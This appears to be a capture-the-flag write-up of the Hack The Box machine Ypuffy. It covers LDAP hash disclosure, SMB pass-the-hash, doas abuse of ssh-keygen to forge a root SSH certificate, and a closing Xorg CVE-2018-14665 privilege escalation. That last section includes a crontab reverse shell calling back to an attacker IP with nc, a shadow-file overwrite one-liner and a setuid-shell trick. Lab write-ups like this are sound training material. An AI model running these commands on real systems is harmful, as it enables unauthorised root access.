# Ypuffy

## Synopsis

Ypuffy was an OpenBSD box, but the author said it could have really been any OS, and I get that. The entire thing was about protocols that operate on any environment. I’ll use ldap to get a hash, which I can use to authenticate an SMB share. There I find an SSH key that gets me a user shell. From there, I’ll abuse my `doas` privilege with `ssh-keygen` to create a signed certificate that I can use to authenticate to the box as root for ssh. In Beyond root, I’ll look at the Xorg privesc vulnerability that became public a month or so after Ypuffy was released, and also explore the web server configuration used in the ssh auth.

## Recon

### `nmap`

`nmap` gives me `ssh`, `http`, `smb`, and `ldap`.

Based on the scan and the httpd version, it looks like I have an OpenBSD
HTTP - TCP 80
Site
Trying to access this site just returns nothing:
root@kali# curl -v 10.10.10.107

- Trying 10.10.10.107...
- TCP_NODELAY set

User-Agent: curl/7.63.0
Accept: /

- Empty reply from server
- Connection #0 to host 10.10.10.107 left intact
curl: (52) Empty reply from server
Firefox shows the same thing:

Wireshark
I’ll fire up WireShark and reload the page. Firefox tries nine times to get the page, and each time the pattern is exact the same:

My system and the server complete the TCP three way handshake to establish the connection (green). Then I send the HTTP GET request (selected packet). Then the server replies with a TCP FIN, ACK, which I reply to with a FIN, ACK, and the server ACK to close the connection (red).
Server Version
nmap had reported this as OpenBSD httpd. How did it determine that if I’m only getting FIN, ACK packets back? I ran my scan again with WireShark open:

There were 928 TCP streams, which is a lot to look through. So I started with a search for the string “OpenBSD httpd”. It looks like when garbage data is sent to the server, it does respond with a “400 Bad Request”. There are many cases of that in this pcap, looking at any will show similar results:

LDAP - port 139
The initial nmap scan showed that this host allows anonymous ldap connections. That means that the nmap ldap script will dump a lot of info without any authentication (I’ll add some comments with <--):

There’s a couple users in there, bob8791 and alice1978. The passwords are both redacted, but alice1978 has an NT hash.
SMB - Port 139 / 445
Enumerate Shares
If I enumerate shares without a password, I get nothing back from either smbmap or smbclient:
root@kali# smbmap -H 10.10.10.107
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.107...

Fortunately, SMB allows pass the hash, and I now have a hash for alice1978. To use a hash with smbclient, you just the same -U username%password format, but just put the hash in place of the password, and add the --pw-nt-hash option:
root@kali# smbclient -L \\\\10.10.10.107 --pw-nt-hash -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B

I can do the same thing with smbmap just giving the hash as a password, but it requires a hash in LM:NT format. I can just add the LM hash for the empty string, aad3b435b51404eeaad3b435b51404ee.

I’ll connect to the alice share and grab the only file there, a ppk file:

However, to make use of this against an OpenBSD target (or Linux target), I’ll need to convert it to OpenSSH format. To do that, I’ll use puttygen, which I can install with apt install putty-tools. Then I’ll call puttygen, telling it that the output should be a private openssh formatted key (-O) and outputting the result to a file (-o) :
root@kali# puttygen my_private_key.ppk -O private-openssh -o alice.pem

root@kali# file alice.pem
my_private_key: PEM RSA private key

Now I can connect as alice1978 using that key and get a shell, and user.txt:

The first line allows for root login, just not with password. The bottom half is disabling of password and challenge response auth, and agent forwarding. At the top, there’s some interesting stuff about Authorized Keys and Authorized Principles:
AuthorizedKeysFile      .ssh/authorized_keys
AuthorizedKeysCommand /usr/local/bin/curl [http://127.0.0.1/sshauth?type=keys&username=%u](http://127.0.0.1/sshauth?type=keys&username=%25u)
AuthorizedKeysCommandUser nobody

TrustedUserCAKeys /home/userca/ca.pub
AuthorizedPrincipalsCommand /usr/local/bin/curl [http://127.0.0.1/sshauth?type=principals&username=%u](http://127.0.0.1/sshauth?type=principals&username=%25u)
AuthorizedPrincipalsCommandUser nobody
The public CA key is there along with likely the private one (that I can’t read):
ypuffy$ ls -l /home/userca/
total 8
-r--------  1 userca  userca  1679 Jul 30 21:08 ca
-r--r--r--  1 userca  userca   410 Jul 30 21:08 ca.pub
Background
Before I interact with this system, it’s worth taking a minute to look at what this is trying to achieve. Key-based authentication for SSH is widely considered both easier and more secure than password-based auth.
However, in a large enterprise, managing ssh keys gets to be quite a pain. If IT wants to provision access to someone, they would have to go to each server and update the authorized_keys file with a new key. And if someone leaves, do it all over again. It just doesn’t scale.
SSH also allows authentication via signed certificates. You configure each server to trust a certificate authority (CA) and any certificates that it signs.
Facebook did a really great post about how they are using signed certs for SSH auth that’s worth a read if you want to hear about it in action.
Enumerating the CA
With the background in mind, I’ll see what I can get out of those two curl commands in the sshd_config file.
Authorized Keys
First, I’ll take a look at the AuthorizedKeysCommand. Running it returns alice’s public key:
ypuffy$ /usr/local/bin/curl '[http://127.0.0.1/sshauth?type=keys&username=alice1978](http://127.0.0.1/sshauth?type=keys&username=alice1978)'
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw== rsa-key-20180716
I can prove that by show it matches what was in the ppk:
root@kali# puttygen my_private_key.ppk -O public-openssh
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw== rsa-key-20180716
I could further enumerate this endpoint, but it seems to return public keys, so even if I am able to find one for another user doesn’t get me very far.
Authorized Principles
The second curl was the AuthorizedPrincipalsCommand. The principal is a link between the certificate and the accounts able to access it via certificate.
If I query this endpoint for alice1978, I get back her name. Same thing with the bob8971 account I found in ldap:
ypuffy$ curl -s "[http://127.0.0.1/sshauth?type=principals&username=alice1978](http://127.0.0.1/sshauth?type=principals&username=alice1978)"
alice1978
ypuffy$ curl -s "[http://127.0.0.1/sshauth?type=principals&username=bob8791](http://127.0.0.1/sshauth?type=principals&username=bob8791)"
bob8791
I’ll run over each of the users in /etc/passwd using a bash loop and see what comes back:
ypuffy$ for name in $(cut -d: -f1 /etc/passwd); do principal=$(curl -s "[http://127.0.0.1/sshauth?type=principals&username=${name}](http://127.0.0.1/sshauth?type=principals&username=$%7Bname%7D)"); if [[ ! -z $principal ]]; then echo "${name}: ${principal}"; fi; done
root: 3m3rgencyB4ckd00r
Here’s the breakdown of that loop:
•	for name in $(cut -d: -f1 /etc/passwd); do - Get the lines from /etc/passwd, and cut on :, taking the first field, the name. Loop over these, using the ${name} variable.
•	principal=$(curl -s "[http://127.0.0.1/sshauth?type=principals&username=${name}](http://127.0.0.1/sshauth?type=principals&username=$%7Bname%7D)"); - use curl to check the principal and store the result in ${principal}.
•	if [[ ! -z $principal ]]; then echo "${name}: ${principal}"; fi; - If ${principal} is not an empty string, print the name and the principal.
Two things to note:
•	I got back something for root, which is definitely interesting, and it isn’t just the user name like the others were. I’ll use this in the next step.
•	I didn’t get back anything for alice1978 or bob8791. How is that possible? I showed their names did return stuff earlier. Because ssh is using this other method for auth, it doesn’t have to check against the passwd file.
doas
On other piece of enumeration is necessary before I move into actually making the jump to root. Whenever I try to escalate privileges on a Linux host, one of the first things I check is sudo -l, to list what command I might be able to run as root using sudo. FreeBSD has a similar construct, doas. I can see what commands I can run with doas by reading /etc/doas.conf:
ypuffy$ cat /etc/doas.conf
permit keepenv :wheel
permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
So I can run ssh-keygen as the userca user.
Getting a Signed root SSH Certificate
By combining the my ability to run ssh-keygen as userca and my knowledge of the root principal, I can generate a signed certificate that will let me SSH into this host as root.
Generate a key-pair
First, I’ll generate a key-pair on my local box using ssh-keygen:
root@kali# ssh-keygen -f id_rsa_ypuffy_root
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in id_rsa_ypuffy_root.
Your public key has been saved in id_rsa_ypuffy_root.pub.
The key fingerprint is:
SHA256:dWbA41JT/ytpdyy7lIKXaU/OQF6Rsl8XH7w7gG37fhI root@kali
The key's randomart image is:
+---[RSA 2048]----+
|         ....    |
|          =. ... |
|         o.o= ++ |
|        ...+oo o=|
|        S. .o+..=|
|           +.=E++|
|          . O=**o|
|           o.O=o+|
|              B=.|
+----[SHA256]-----+

root@kali# ls id_rsa_ypuffy_root*
id_rsa_ypuffy_root  id_rsa_ypuffy_root.pub
scp Public Key to Ypuffy
Next, I need to move these to the CA host for signing. I’ll use scp using alice’s public key to /tmp:
root@kali# scp -i alice.pem id_rsa_ypuffy_root.pub [alice1978@10.10.10.107](mailto:alice1978@10.10.10.107):/tmp/
id_rsa_ypuffy_root.pub                                                                                                                                                                    100%  391    20.3KB/s   00:00
Generate Signed Certificate
Now I’m going to generate the signed certificate using ssh-keygen running as userca. First, I’ll need to make sure my public key can be read by userca:
ypuffy$ chmod +r id_rsa_ypuffy_root.pub
ypuffy$ ls -l id_rsa_ypuffy_root.pub
-rwxr-xr--  1 alice1978  wheel  391 Feb  1 08:55 id_rsa_ypuffy_root.pub
Now, I’ll generate the cert:
ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I 0xdf -n 3m3rgencyB4ckd00r -V +52w id_rsa_ypuffy_root.pub
Signed user key id_rsa_ypuffy_root-cert.pub: id "0xdf" serial 0 for 3m3rgencyB4ckd00r valid from 2019-02-01T09:01:00 to 2020-01-31T09:02:19

ypuffy$ ls -l id_rsa_ypuffy_root*
-rw-r--r--  1 userca     wheel  1504 Feb  1 09:02 id_rsa_ypuffy_root-cert.pub
-rwxr-xr--  1 alice1978  wheel   391 Feb  1 08:55 id_rsa_ypuffy_root.pub
Here’s the breakdown of the options I used with ssh-keygen:
•	-s /home/userca/ca - Specifies that I want to sign a public key using the given CA private key.
•	-I 0xdf - The identify associated with the certificate. In this case, it’s arbitrary. In an enterprise, they could use this to track who was assigned a given cert.
•	-n 3m3rgencyB4ckd00r - The principles to be included in the certificate.
•	-V +52w - Make this certificate good for 52 weeks.
•	id_rsa_ypuffy_root.pub - the public key that will be associated with the certificate.
As the output shows, the command output a file ending in -cert.pub. The original public key is unchanged.
scp Certificate
I can delete the public key here since I don’t need it anymore (I have a copy on my host). I’ll need to get the certificate back. I could just copy/paste, but I’ll use scp:
root@kali# scp -i alice.pem [alice1978@10.10.10.107](mailto:alice1978@10.10.10.107):/tmp/id_rsa_ypuffy_root-cert.pub .
id_rsa_ypuffy_root-cert.pub                             100% 1504    73.0KB/s   00:00
Examine Certificate / Keys
I can look at my certificate and keys using ssh-keygen. I’ll start by getting the certificate information (-L) on the file:
root@kali# ssh-keygen -L -f id_rsa_ypuffy_root-cert.pub
id_rsa_ypuffy_root-cert.pub:
Type: [ssh-rsa-cert-v01@openssh.com](mailto:ssh-rsa-cert-v01@openssh.com) user certificate
Public key: RSA-CERT SHA256:dWbA41JT/ytpdyy7lIKXaU/OQF6Rsl8XH7w7gG37fhI
Signing CA: RSA SHA256:WCPFBuZqiubacS+hgAGylLHBjatuKa8zoWO2vFFycsg
Key ID: "0xdf"
Serial: 0
Valid: from 2019-02-01T09:01:00 to 2020-01-31T09:02:19
Principals:
3m3rgencyB4ckd00r
Critical Options: (none)
Extensions:
permit-X11-forwarding
permit-agent-forwarding
permit-port-forwarding
permit-pty
permit-user-rc
I can use ssh-keygen to check out the public key associated with my private key and see that it matches, which is cool, since this private key didn’t go to the server, but it is connected to this certificate:
root@kali# ssh-keygen -l -f id_rsa_ypuffy_root
2048 SHA256:dWbA41JT/ytpdyy7lIKXaU/OQF6Rsl8XH7w7gG37fhI root@kali (RSA)
Logging In as root
Now I can ssh in as root. From the ssh man page:
-i identity_file
Selects a file from which the identity (private key) for public
key authentication is read.  The default is ~/.ssh/id_dsa,
~/.ssh/id_ecdsa, ~/.ssh/id_ed25519 and ~/.ssh/id_rsa.  Identity
files may also be specified on a per-host basis in the configu‐
ration file.  It is possible to have multiple -i options (and
multiple identities specified in configuration files).  If no
certificates have been explicitly specified by the
CertificateFile directive, ssh will also try to load certifi‐
cate information from the filename obtained by appending
-cert.pub to identity filenames.
So I’m need my certificate to match my private key plus -cert.pub, which it does. With those two in the same directory, log in, specifying the private key:
root@kali# ls id_rsa_ypuffy_root*
id_rsa_ypuffy_root  id_rsa_ypuffy_root-cert.pub

root@kali# ssh -i id_rsa_ypuffy_root [root@10.10.10.107](mailto:root@10.10.10.107)

If I run -ssh with the -v, I will get debug output. If I compare the output from logging in as root with logging in as alice1978 (just a private key, no certificate), it’s basically the same up until it gets to the auth. Then for the certificate login, it looks like this (I’ve added comment lines):

Beyond Root
Alternative Privesc: alice1978 –> root via CVE-2018-14665
Background
Ypuffy was released in September 2018, and a little over a month later (on 25 October), CVE-2018-14665 was released identifying an incorrect permission check in Xorg that allowed privilege escalation from unprivileged users.
There are tons of scripts on GitHub etc that will exploit this vulnerability automatically. There’s also a Metasploit module. I’m going to do it manually.
The basic vulnerability is pretty simple: Xorg, assuming it’s running setuid, can overwrite a log file wherever the user tells it to with whatever data the user gives it. There will be other data in there, but that can still be quite powerful.
For example, HackerFantastic on Twitter tweeted out a POC in a single tweet:
#CVE-2018-14665 - a LPE exploit via [https://t.co/eax3fvaAjE](https://t.co/eax3fvaAjE) fits in a tweetcd /etc; Xorg -fp "root::16431:0:99999:7:::" -logfile shadow :1;suOverwrite shadow (or any) file on most Linux, get root privileges. *BSD and any other Xorg desktop also affected.
— Hacker Fantastic (@hackerfantastic) October 25, 2018
Exploit
With that in mind, there are a few places I could target. The /etc/master.passwd file (like /etc/shadow on BSD). I’ll go for the crontab.
I started a listener on port 443, and then wrote my cron:
ypuffy$ Xorg -fp "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 443 > /tmp/f" -logfile crontab :1 &
This will error out (and I’ll have to kill it), but it will also write that dump to a log file which I specified, /etc/crontab.
I can look at that file:
[178588.565] (WW) checkDevMem: failed to open /dev/xf86 and /dev/mem

There’s a ton going on there, and a bunch more I cut out, but all that really matters is the line in the middle with a cron-formatted string saying to initiate a reverse shell back to me every minute.
The next time the minute rolls over, I get a root shell:
root@kali# nc -lnvp 443

If you do happen to overwrite another file, then it will save the original file by appending .old.
Another options for a cron would be to make a setuid shell:
ypuffy$ Xorg -fp "* * * * * root cp /bin/sh /usr/local/bin/.df; chmod 4777 /usr/local/bin/.df" -logfile crontab :1 &
Wait for the minute to roll, and:

WebServer Config
Apache
/etc/httpd.conf shows how the server is set up:
server "ypuffy.hackthebox.htb" {
listen on * port 80

    location "/userca*" {
            root "/userca"
            root strip 1
            directory auto index
    }

    location "/sshauth*" {
            fastcgi socket "/run/wsgi/sshauthd.socket"
    }

    location * {
            block drop
    }

}
The server listens on 80, and there are three paths it cares about:
1	/userca* - Any path starting with that (so /userca, /usercaa, and /userca0xdf) all resolve to the /var/www/userca folder, with dir listing enabled.ypuffy# pwd
2	/var/www/userca
3	ypuffy# ls
4	ca.pub
5	
6	/sshauth*- This will use a wsgi set up, just like Dab last week. I’ll dig into this next.
7	Anything else is blocked and dropped. This explains the Fin/Ack packets I saw on initial enumeration.
wsgi
The wsgi app is in /var/appsrv/sshauthd:
ypuffy# ls
sshauthd.ini [sshauthd.py](http://sshauthd.py/)  sshauthd.pyc [wsgi.py](http://wsgi.py/)
Just like in Dab, the ini file describes how wsgi starts, in this case, with 3 processes, using the same socket identified in the httpd config:
ypuffy# cat sshauthd.ini
[uwsgi]
plugins         = python
chdir           = /var/appsrv/sshauthd
pythonpath      = /usr/local/bin
wsgi-file       = /var/appsrv/sshauthd/wsgi.py
safe-pidfile    = /var/appsrv/sshauthd.pid
fastcgi-socket  = /var/www/run/wsgi/sshauthd.socket
chmod-socket    = 660
master          = true
processes       = 3
callable        = app
vacuum          = true
the [sshauthd.py](http://sshauthd.py/) file describes how web requests are handled:

```bash
from flask import Flask, request, abort
import psycopg2
app = Flask(**name**)

def validate_uid(uid):
result = False
uid_len = len(uid)

if 1 < uid_len < 32:
    if uid[0].isalpha() and uid[1:].isalnum():
        result = True
return result

def fetch_data(query, params):
result_str = ''

conn = psycopg2.connect("dbname=sshauth")
curs = conn.cursor()
curs.execute(query, params)
result_list = curs.fetchall()
curs.close()
conn.close()

while result_list:
    result_str += '%s\\n' % result_list.pop()[0]
return result_str

@app.route('/sshauth', methods=['GET'])
def sshauth():
return_data = ''
params = []
query_type = request.args.get('type')
uid = request.args.get('username')

if (not uid) or (not query_type):
    abort(400)

if query_type == 'principals':
    query_str = 'SELECT principal from principals where client >>= %s and uid = %s;'
    params.append(request.remote_addr)
elif query_type == 'keys':
    query_str = 'SELECT key from keys where uid = %s;'
else:
    abort(400)

if validate_uid(uid):
    params.append(uid)
    return_data = fetch_data(query_str,params)
return return_data
```

Basically, for the two different type options, it builds the Postgres queries, and gets the results from the DB. There’s also a filter function to look for only alphanumeric characters, between 2 and 31 characters long, starting with a letter. This prevents any kind of injection attack against the database.
